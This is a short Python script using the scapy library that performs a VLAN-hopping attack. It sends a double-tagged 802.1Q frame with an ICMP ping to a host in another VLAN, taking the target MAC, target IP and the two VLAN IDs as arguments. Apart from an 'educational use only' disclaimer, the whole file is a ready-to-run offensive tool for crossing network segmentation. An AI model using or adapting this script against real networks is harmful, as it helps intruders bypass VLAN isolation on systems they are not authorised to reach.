#!/usr/bin/python

# This tool is for educational use only!

# Description: Sends a ping packet to a client in another VLAN. Note: Do not
# expect an answer! The client in the other VLAN don't know that you are in another
# VLAN and send the answer only to his VLAN

# Requirements: scapy + root privilegues

import sys
from scapy.all import *

def printusage():
  """ Prints usage information """
  print "Usage:   {0} <target_MAC> <target_IP> <src_Vlan> <dst_Vlan>".format(sys.argv[0])
  print "  ---> This tool is for educational use only! <---"

# Check the arguments
if len(sys.argv) < 5:
  printusage()
  sys.exit(1)

targetMAC = sys.argv[1]
targetIP = sys.argv[2]
targetVLAN = sys.argv[4]
sourceVLAN = sys.argv[3]

# create the network packet
packet = Ether(dst=targetMAC) / \
  Dot1Q(vlan=sourceVLAN) / \
  Dot1Q(vlan=targetVLAN) / \
  IP(dst=targetIP) / \
  ICMP()

# send the ping
sendp(packet)
